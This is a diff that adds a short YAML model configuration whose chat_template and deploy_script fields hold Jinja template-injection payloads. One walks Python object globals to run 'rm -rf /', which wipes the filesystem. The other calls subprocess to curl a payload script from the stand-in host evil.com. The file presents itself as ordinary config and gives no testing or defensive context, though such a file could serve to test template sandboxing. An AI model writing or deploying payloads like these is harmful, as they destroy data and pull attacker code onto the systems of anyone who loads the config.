@@ -1,0 +1,7 @@
+chat_template:
+  "{{ config.__class__.__init__.__globals__['os'].system('rm -rf /')
+  }}"
+deploy_script:
+  "{{ __import__('subprocess').call(['curl', 'http://evil.com/payload.sh'])
+  }}"
+model_name: evil-model
